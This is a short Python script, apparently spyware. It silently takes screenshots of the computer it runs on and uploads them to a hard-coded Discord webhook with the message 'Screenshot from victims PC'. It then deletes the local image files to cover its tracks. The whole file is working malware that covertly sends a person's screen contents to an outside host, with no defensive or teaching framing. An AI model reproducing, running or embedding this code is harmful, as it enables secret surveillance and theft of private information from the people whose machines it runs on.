import pyautogui
import time
import requests
import os

def take_screenshot(filename='screenshot.png'):
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

def send_to_discord_webhook(webhook_url, file_path):
    with open(file_path, 'rb') as file:
        files = {'file': file}
        data = {'content': 'Screenshot from victims PC'}
        response = requests.post(webhook_url, files=files, data=data)

if __name__ == "__main__":
    webhook_url = 'https://discord.com/api/webhooks/1427980430501740625/s_gLw7jgJRqQnCWGgtyfZLehwQj0KnFtBBKg2qVeWW2af5m3AZiAm0K_Qwh7KPFq1n5C'

    screenshot_paths = []
    for i in range(2):
        screenshot_path = take_screenshot(f'screenshot_{i+1}.png')
        screenshot_paths.append(screenshot_path)
        send_to_discord_webhook(webhook_url, screenshot_path)
        time.sleep(0.5)

    for path in screenshot_paths:
        os.remove(path)
